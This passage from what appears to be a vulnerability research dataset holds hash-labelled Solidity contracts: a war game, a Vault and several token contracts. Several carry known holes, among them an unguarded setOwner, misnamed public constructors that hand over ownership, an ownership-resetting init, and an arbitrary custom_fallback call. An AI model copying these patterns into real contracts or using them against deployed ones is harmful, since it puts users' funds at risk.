    mapping (address => uint) public ownerArmyCount;    
    mapping (uint => uint) public armyDronesCount;
    mapping (uint => uint) public armyPlanesCount;
    mapping (uint => uint) public armyHelicoptersCount;
    mapping (uint => uint) public armyTanksCount;
    mapping (uint => uint) public armyAircraftCarriersCount;
    mapping (uint => uint) public armySubmarinesCount;
    mapping (uint => uint) public armySatelitesCount;
    mapping (uint => uint) public armyCountBattlesWon;
    mapping (uint => uint) public armyCountBattlesLost;
    function _createArmy(string _name, string _idArmy, uint _price, uint _attackBonus, uint _defenseBonus) public onlyCeo {
        armies.push(Army(_name, _idArmy, 0, _price, _attackBonus, _defenseBonus, true, address(this), 0));
    }
    function purchaseArmy(uint _armyId) public payable {
        require(msg.value == armies[_armyId].price);
        require(msg.value > 0);
        if(armies[_armyId].ownerAddress != address(this)) {
            uint CommissionOwnerValue = msg.value - (msg.value / 10);
            armies[_armyId].ownerAddress.transfer(CommissionOwnerValue);
        }
        _ownershipArmy(_armyId);
    }
    function purchaseSoldiers(uint _armyId, uint _countSoldiers) public payable {
        require(msg.value > 0);
        uint256 msgValue = msg.value;
        if(msgValue == 1000000000000000 && _countSoldiers == 1) {
            armies[_armyId].soldiersCount = armies[_armyId].soldiersCount + _countSoldiers;
        } else if(msgValue == 8000000000000000 && _countSoldiers == 10) {
            armies[_armyId].soldiersCount = armies[_armyId].soldiersCount + _countSoldiers;
        } else if(msgValue == 65000000000000000 && _countSoldiers == 100) {
            armies[_armyId].soldiersCount = armies[_armyId].soldiersCount + _countSoldiers;
        } else if(msgValue == 500000000000000000 && _countSoldiers == 1000) {
            armies[_armyId].soldiersCount = armies[_armyId].soldiersCount + _countSoldiers;
        }
    }
    function purchaseWeapons(uint _armyId, uint _weaponId, uint _bonusAttack, uint _bonusDefense ) public payable {
        uint isValid = 0;
        uint256 msgValue = msg.value;
        if(msgValue == 10000000000000000 && _weaponId == 0) {
            armyDronesCount[_armyId]++;
            isValid = 1;
        } else if(msgValue == 25000000000000000 && _weaponId == 1) {
             armyPlanesCount[_armyId]++;
            isValid = 1;
        } else if(msgValue == 25000000000000000 && _weaponId == 2) {
            armyHelicoptersCount[_armyId]++;
            isValid = 1;
        } else if(msgValue == 45000000000000000 && _weaponId == 3) {
            armyTanksCount[_armyId]++;
            isValid = 1;
        } else if(msgValue == 100000000000000000 && _weaponId == 4) {
            armyAircraftCarriersCount[_armyId]++;
            isValid = 1;
        } else if(msgValue == 100000000000000000 && _weaponId == 5) {
            armySubmarinesCount[_armyId]++;
            isValid = 1;
        } else if(msgValue == 120000000000000000 && _weaponId == 6) {
            armySatelitesCount[_armyId]++;
            isValid = 1;
        } 
        if(isValid == 1) {
            armies[_armyId].attackBonus = armies[_armyId].attackBonus + _bonusAttack;
            armies[_armyId].defenseBonus = armies[_armyId].defenseBonus + _bonusDefense;
        }
    }
    function _ownershipArmy(uint armyId) private {
        require (ownerArmyCount[msg.sender] == 0);
        require(armies[armyId].isForSale == true);
        require(armies[armyId].price == msg.value);
        ownerArmyCount[armies[armyId].ownerAddress]--;
        armies[armyId].ownerAddress = msg.sender;
        ownerToArmy[msg.sender] = armyId;
        ownerArmyCount[msg.sender]++;
        armies[armyId].isForSale = false;
    }
    function startNewBattle(uint _idArmyAttacking, uint _idArmyDefensing, uint _randomIndicatorAttack, uint _randomIndicatorDefense) public returns(uint) {
        require (armies[_idArmyAttacking].ownerAddress == msg.sender);
        uint ScoreAttack = armies[_idArmyAttacking].attackBonus * (armies[_idArmyAttacking].soldiersCount/3) + armies[_idArmyAttacking].soldiersCount  + _randomIndicatorAttack; 
        uint ScoreDefense = armies[_idArmyAttacking].defenseBonus * (armies[_idArmyDefensing].soldiersCount/2) + armies[_idArmyDefensing].soldiersCount + _randomIndicatorDefense; 
        uint VictoriousArmy;
        uint ExperiencePointsGained;
        if(ScoreDefense >= ScoreAttack) {
            VictoriousArmy = _idArmyDefensing;
            ExperiencePointsGained = armies[_idArmyAttacking].attackBonus + 2;
            armies[_idArmyDefensing].experiencePoints = armies[_idArmyDefensing].experiencePoints + ExperiencePointsGained;
            armyCountBattlesWon[_idArmyDefensing]++;
            armyCountBattlesLost[_idArmyAttacking]++;
        } else {
            VictoriousArmy = _idArmyAttacking;
            ExperiencePointsGained = armies[_idArmyDefensing].defenseBonus + 2;
            armies[_idArmyAttacking].experiencePoints = armies[_idArmyAttacking].experiencePoints + ExperiencePointsGained;
            armyCountBattlesWon[_idArmyAttacking]++;
            armyCountBattlesLost[_idArmyDefensing]++;
        }
        battles.push(Battle(_idArmyAttacking, _idArmyDefensing, VictoriousArmy));  
        return (VictoriousArmy);
    }
    function ownerSellArmy(uint _armyId, uint256 _amount) public {
        require (armies[_armyId].ownerAddress == msg.sender);
        require (_amount > 0);
        require (armies[_armyId].isForSale == false);
        armies[_armyId].isForSale = true;
        armies[_armyId].price = _amount;
    }
    function ownerCancelArmyMarketplace(uint _armyId) public {
        require (armies[_armyId].ownerAddress == msg.sender);
        require (armies[_armyId].isForSale == true);
        armies[_armyId].isForSale = false;
    }
    function getArmyFullData(uint armyId) public view returns(string, string, uint, uint256, uint, uint, bool) {
        string storage ArmyName = armies[armyId].name;
        string storage ArmyId = armies[armyId].idArmy;
        uint ArmyExperiencePoints = armies[armyId].experiencePoints;
        uint256 ArmyPrice = armies[armyId].price;
        uint ArmyAttack = armies[armyId].attackBonus;
        uint ArmyDefense = armies[armyId].defenseBonus;
        bool ArmyIsForSale = armies[armyId].isForSale;
        return (ArmyName, ArmyId, ArmyExperiencePoints, ArmyPrice, ArmyAttack, ArmyDefense, ArmyIsForSale);
    }
    function getArmyOwner(uint armyId) public view returns(address, bool) {
        return (armies[armyId].ownerAddress, armies[armyId].isForSale);
    }
    function getSenderArmyDetails() public view returns(uint, string) {
        uint ArmyId = ownerToArmy[msg.sender];
        string storage ArmyName = armies[ArmyId].name;
        return (ArmyId, ArmyName);
    }
    function getSenderArmyCount() public view returns(uint) {
        uint ArmiesCount = ownerArmyCount[msg.sender];
        return (ArmiesCount);
    }
    function getArmySoldiersCount(uint armyId) public view returns(uint) {
        uint SoldiersCount = armies[armyId].soldiersCount;
        return (SoldiersCount);
    }
    function getWeaponsArmy1(uint armyId) public view returns(uint, uint, uint, uint)  {
        uint CountDrones = armyDronesCount[armyId];
        uint CountPlanes = armyPlanesCount[armyId];
        uint CountHelicopters = armyHelicoptersCount[armyId];
        uint CountTanks = armyTanksCount[armyId];
        return (CountDrones, CountPlanes, CountHelicopters, CountTanks);
    }
    function getWeaponsArmy2(uint armyId) public view returns(uint, uint, uint)  {
        uint CountAircraftCarriers = armyAircraftCarriersCount[armyId];
        uint CountSubmarines = armySubmarinesCount[armyId];
        uint CountSatelites = armySatelitesCount[armyId];
        return (CountAircraftCarriers, CountSubmarines, CountSatelites);
    }
    function getArmyBattles(uint _armyId) public view returns(uint, uint) {
        return (armyCountBattlesWon[_armyId], armyCountBattlesLost[_armyId]);
    }
    function getDetailsBattles(uint battleId) public view returns(uint, uint, uint, string, string) {
        return (battles[battleId].idArmyAttacking, battles[battleId].idArmyDefensing, battles[battleId].idArmyVictorious, armies[battles[battleId].idArmyAttacking].idArmy, armies[battles[battleId].idArmyDefensing].idArmy);
    }
    function getBattlesCount() public view returns(uint) {
        return (battles.length);
    }
    function withdraw(uint amount, uint who) public onlyCeo returns(bool) {
        require(amount <= this.balance);
        if(who == 0) {
            ceoAddress.transfer(amount);
        } else {
            cfoAddress.transfer(amount);
        }
        return true;
    }
    function KryptoArmy() public onlyCeo {
        _createArmy("United States", "USA", 550000000000000000, 8, 9);
        _createArmy("North Korea", "NK", 500000000000000000, 10, 5);
        _createArmy("Russia", "RUS", 450000000000000000, 8, 7);
        _createArmy("China", "CHN", 450000000000000000, 7, 8);
        _createArmy("Japan", "JPN", 420000000000000000, 7, 7);
        _createArmy("France", "FRA", 400000000000000000, 6, 8);
        _createArmy("Germany", "GER", 400000000000000000, 7, 6);
        _createArmy("India", "IND", 400000000000000000, 7, 6);
        _createArmy("United Kingdom", "UK", 350000000000000000, 5, 7);
        _createArmy("South Korea", "SK", 350000000000000000, 6, 6);
        _createArmy("Turkey", "TUR", 300000000000000000, 7, 4);
    }
}
```

## RQ1_5181a8367a1c

SHA-256 `9d692642aef3a3f1b97a161ee30e0790e5552354373f4776545a67b37cc65d4d`

```solidity
pragma solidity ^0.4.18;
contract Vault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event TransferOwnership(address indexed from, address indexed to);
    address Owner;
    function transferOwnership(address to) public onlyOwner {
        TransferOwnership(Owner, to); Owner = to;
    }
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.1 ether;
        Locked = false;
        deposit();
    }
    function SetReleaseDate(uint NewDate) {
        Date = NewDate;
    }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function withdraw(uint amount) public payable { withdrawTo(msg.sender, amount); }
    function withdrawTo(address to, uint amount) public onlyOwner {
        if (WithdrawalEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
    function lock() public { Locked = true; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    modifier open { if (!Locked) _; }
    function kill() { require(this.balance == 0); selfdestruct(Owner); }
}
```

## RQ1_ce63e7a98231

SHA-256 `98843b87e72f607f9fb9339c2e15e2ef532d59303447fdfc4452091100849462`

```solidity
pragma solidity ^0.4.20;
interface tokenRecipient {
  function receiveApproval( address from, uint256 value, bytes data ) external;
}
interface ContractReceiver {
  function tokenFallback( address from, uint value, bytes data ) external;
}
contract Owned {
  address public owner;
  function owned() public {
    owner = msg.sender;
  }
  function changeOwner(address _newOwner) public onlyOwner {
    owner = _newOwner;
  }
  modifier onlyOwner {
    require (msg.sender == owner);
    _;
  }
}
contract Token is Owned {
  string  public name;
  string  public symbol;
  uint8   public decimals = 18;
  uint256 public totalSupply;
  mapping( address => uint256 ) balances;
  mapping( address => mapping(address => uint256) ) allowances;
  event Approval(
    address indexed owner,
    address indexed spender,
    uint value
  );
  event Transfer(
    address indexed from,
    address indexed to,
    uint256 value
  );
  function Token(
    uint256 _initialSupply,
    string _tokenName,
    string _tokenSymbol
  )
    public
  {
    totalSupply = _initialSupply * 10**18;
    balances[msg.sender] = _initialSupply * 10**18;
    name = _tokenName;
    symbol = _tokenSymbol;
  }
  function balanceOf( address owner ) public constant returns (uint) {
    return balances[owner];
  }
  function approve( address spender, uint256 value ) public returns (bool success) {
    allowances[msg.sender][spender] = value;
    Approval( msg.sender, spender, value );
    return true;
  }
  function safeApprove(
    address _spender,
    uint256 _currentValue,
    uint256 _value
  )
    public
    returns (bool success)
  {
    if (allowances[msg.sender][_spender] == _currentValue)
      return approve(_spender, _value);
    return false;
  }
  function allowance(
    address owner,
    address spender
  )
    public constant
    returns (uint256 remaining)
  {
    return allowances[owner][spender];
  }
  function transfer(
    address to,
    uint256 value
  )
    public
    returns (bool success)
  {
    bytes memory empty; 
    _transfer( msg.sender, to, value, empty );
    return true;
  }
  function transferFrom(
    address from,
    address to,
    uint256 value
  )
    public
    returns (bool success)
  {
    require( value <= allowances[from][msg.sender] );
    allowances[from][msg.sender] -= value;
    bytes memory empty;
    _transfer( from, to, value, empty );
    return true;
  }
  function approveAndCall(
    address spender,
    uint256 value,
    bytes context
  )
    public
    returns (bool success)
  {
    if (approve(spender, value))
    {
      tokenRecipient recip = tokenRecipient(spender);
      if (isContract(recip))
        recip.receiveApproval(msg.sender, value, context);
      return true;
    }
    return false;
  }
  function transfer(
    address to,
    uint value,
    bytes data,
    string custom_fallback
  )
    public
    returns (bool success)
  {
    _transfer( msg.sender, to, value, data );
    require(
      address(to).call.value(0)(
        bytes4(keccak256(custom_fallback)),
        msg.sender,
        value,
        data
      )
    );
    return true;
  }
  function transfer(
    address to,
    uint value,
    bytes data
  )
    public
    returns (bool success)
  {
    if (isContract(to)) {
      return transferToContract( to, value, data );
    }
    _transfer( msg.sender, to, value, data );
    return true;
  }
  function transferToContract(
    address to,
    uint value,
    bytes data
  )
    private
    returns (bool success)
  {
    _transfer( msg.sender, to, value, data );
    ContractReceiver rx = ContractReceiver(to);
    if (isContract(rx)) {
      rx.tokenFallback( msg.sender, value, data );
      return true;
    }
    return false;
  }
  function isContract(address _addr)
    private
    constant
    returns (bool)
  {
    uint length;
    assembly { length := extcodesize(_addr) }
    return (length > 0);
  }
  function _transfer(
    address from,
    address to,
    uint value,
    bytes data
  )
    internal
  {
    require( to != 0x0 );
    require( balances[from] >= value );
    require( balances[to] + value > balances[to] ); 
    balances[from] -= value;
    balances[to] += value;
    bytes memory ignore;
    ignore = data; 
    Transfer( from, to, value ); 
  }
}
```

## RQ1_34bd4d44b11a

SHA-256 `b90edf1654a47fa13613a4e48d2f8268702c6b93ac0528a5a2194c2484985b38`

```solidity
pragma solidity ^0.4.19;
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }
contract SafeMath {
  function safeMul(uint256 a, uint256 b) returns (uint256) {
    uint256 c = a * b;
    require(a == 0 || c / a == b);
    return c;
  }
  function safeSub(uint256 a, uint256 b) returns (uint256) {
    require(b <= a);
    return a - b;
  }
  function safeAdd(uint256 a, uint256 b) returns (uint256) {
    uint c = a + b;
    require(c >= a && c >= b);
    return c;
  }
}
contract Owned {
  address public owner;
  function Owned() {
    owner = msg.sender;
  }
  function setOwner(address _owner) returns (bool success) {
    owner = _owner;
    return true;
  }
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
}
contract IDXM is Owned, SafeMath {
  uint8 public decimals = 8;
  bytes32 public standard = 'Token 0.1';
  bytes32 public name = 'IDEX Membership';
  bytes32 public symbol = 'IDXM';
  uint256 public totalSupply;
  event Approval(address indexed from, address indexed spender, uint256 amount);
  mapping (address => uint256) public balanceOf;
  mapping (address => mapping (address => uint256)) public allowance;
  event Transfer(address indexed from, address indexed to, uint256 value);
  uint256 public baseFeeDivisor;
  uint256 public feeDivisor;
  uint256 public singleIDXMQty;
  function () external {
    throw;
  }
  uint8 public feeDecimals = 8;
  struct Validity {
    uint256 last;
    uint256 ts;
  }
  mapping (address => Validity) public validAfter;
  uint256 public mustHoldFor = 604800;
  mapping (address => uint256) public exportFee;
  function IDXM() {
    totalSupply = 200000000000;
    balanceOf[msg.sender] = totalSupply;
    exportFee[0x00000000000000000000000000000000000000ff] = 100000000;
    precalculate();
  }
  bool public balancesLocked = false;
  function uploadBalances(address[] addresses, uint256[] balances) onlyOwner {
    require(!balancesLocked);
    require(addresses.length == balances.length);
    uint256 sum;
    for (uint256 i = 0; i < uint256(addresses.length); i++) {
      sum = safeAdd(sum, safeSub(balances[i], balanceOf[addresses[i]]));
      balanceOf[addresses[i]] = balances[i];
    }
    balanceOf[owner] = safeSub(balanceOf[owner], sum);
  }
  function lockBalances() onlyOwner {
    balancesLocked = true;
  }
  function transfer(address _to, uint256 _amount) returns (bool success) {
    require(!locked);
    require(balanceOf[msg.sender] >= _amount);
    require(balanceOf[_to] + _amount >= balanceOf[_to]);
    balanceOf[msg.sender] -= _amount;
    uint256 preBalance = balanceOf[_to];
    balanceOf[_to] += _amount;
    bool alreadyMax = preBalance >= singleIDXMQty;
    if (!alreadyMax) {
      if (now >= validAfter[_to].ts + mustHoldFor) validAfter[_to].last = preBalance;
      validAfter[_to].ts = now;
    }
    if (validAfter[msg.sender].last > balanceOf[msg.sender]) validAfter[msg.sender].last = balanceOf[msg.sender];
    Transfer(msg.sender, _to, _amount);
    return true;
  }
  function transferFrom(address _from, address _to, uint256 _amount) returns (bool success) {
    require(!locked);
    require(balanceOf[_from] >= _amount);
    require(balanceOf[_to] + _amount >= balanceOf[_to]);
    require(_amount <= allowance[_from][msg.sender]);
    balanceOf[_from] -= _amount;
    uint256 preBalance = balanceOf[_to];
    balanceOf[_to] += _amount;
    allowance[_from][msg.sender] -= _amount;
    bool alreadyMax = preBalance >= singleIDXMQty;
    if (!alreadyMax) {
      if (now >= validAfter[_to].ts + mustHoldFor) validAfter[_to].last = preBalance;
      validAfter[_to].ts = now;
    }
    if (validAfter[_from].last > balanceOf[_from]) validAfter[_from].last = balanceOf[_from];
    Transfer(_from, _to, _amount);
    return true;
  }
  function approveAndCall(address _spender, uint256 _amount, bytes _extraData) returns (bool success) {
    tokenRecipient spender = tokenRecipient(_spender);
    if (approve(_spender, _amount)) {
      spender.receiveApproval(msg.sender, _amount, this, _extraData);
      return true;
    }
  }
  function approve(address _spender, uint256 _amount) returns (bool success) {
    require(!locked);
    allowance[msg.sender][_spender] = _amount;
    Approval(msg.sender, _spender, _amount);
    return true;
  }
  function setExportFee(address addr, uint256 fee) onlyOwner {
    require(addr != 0x00000000000000000000000000000000000000ff);
    exportFee[addr] = fee;
  }
  function setHoldingPeriod(uint256 ts) onlyOwner {
    mustHoldFor = ts;
  }
  function feeFor(address from, address to, uint256 amount) constant external returns (uint256 value) {
    uint256 fee = exportFee[from];
    if (fee == 0) return 0;
    uint256 amountHeld;
    if (balanceOf[to] != 0) {
      if (validAfter[to].ts + mustHoldFor < now) amountHeld = balanceOf[to];
      else amountHeld = validAfter[to].last;
      if (amountHeld >= singleIDXMQty) return 0;
      return amount*fee*(singleIDXMQty - amountHeld) / feeDivisor;
    } else return amount*fee / baseFeeDivisor;
  }
  bool public locked = true;
  function unlockToken() onlyOwner {
    locked = false;
  }
  function precalculate() internal returns (bool success) {
    baseFeeDivisor = pow10(1, feeDecimals);
    feeDivisor = pow10(1, feeDecimals + decimals);
    singleIDXMQty = pow10(1, decimals);
  }
  function div10(uint256 a, uint8 b) internal returns (uint256 result) {
    for (uint8 i = 0; i < b; i++) {
      a /= 10;
    }
    return a;
  }
  function pow10(uint256 a, uint8 b) internal returns (uint256 result) {
    for (uint8 i = 0; i < b; i++) {
      a *= 10;
    }
    return a;
  }
}
```

## RQ1_fb0f325e2800

SHA-256 `8d7cbb9e085fbe7c1ec8da28f590f54972fd34eb151da7d958fd0402e2eda6f7`

```solidity
pragma solidity ^0.4.19;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) public returns (bool);
    function totalSupply() constant public returns (uint256 supply);
    function balanceOf(address _owner) constant public returns (uint256 balance);
}
contract EthereumDiamond is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "Ethereum Diamond";
    string public constant symbol = "ETD";
    uint public constant decimals = 8;
    uint256 public totalSupply = 99000000000000e8;
    uint256 public totalDistributed = 98000000000000e8;
    uint256 public totalRemaining = totalSupply.sub(totalDistributed);
    uint256 public value;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function ZeroXEth () public {
        owner = msg.sender;
        value = 34519e8;
        distr(owner, totalDistributed);
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function enableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = false;
        }
    }
    function disableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = true;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function airdrop(address[] addresses) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(value <= totalRemaining);
        for (uint i = 0; i < addresses.length; i++) {
            require(value <= totalRemaining);
            distr(addresses[i], value);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function distribution(address[] addresses, uint256 amount) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(amount <= totalRemaining);
        for (uint i = 0; i < addresses.length; i++) {
            require(amount <= totalRemaining);
            distr(addresses[i], amount);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function distributeAmounts(address[] addresses, uint256[] amounts) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(addresses.length == amounts.length);
        for (uint8 i = 0; i < addresses.length; i++) {
            require(amounts[i] <= totalRemaining);
            distr(addresses[i], amounts[i]);
            if (totalDistributed >= totalSupply) {
                distributionFinished = true;
            }
        }
    }
    function () external payable {
            getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        value = value.div(100000).mul(99999);
    }
    function balanceOf(address _owner) constant public returns (uint256) {
	    return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = this.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_0ff5d2904232

SHA-256 `dd98da7f4ee5358bfdd7c1428847a6b8a19b990b7b4cf4109c5da7b2cfdaa280`

```solidity
pragma solidity ^0.4.22;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) external returns (bool);
    function totalSupply() constant external returns (uint256 supply);
    function balanceOf(address _owner) constant external returns (uint256 balance);
}
contract iBird is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "iBird";
    string public constant symbol = "IBI";
    uint public constant decimals = 18;
uint256 public totalSupply = 30000000000e18;
uint256 public totalDistributed = 15000000000e18;
uint256 public totalRemaining = totalSupply.sub(totalDistributed);
uint256 public value = 150000e18;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function SiaCashCoin() public {
        owner = msg.sender;
        balances[owner] = totalDistributed;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        value = value.div(100000).mul(99999);
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = address(this).balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }
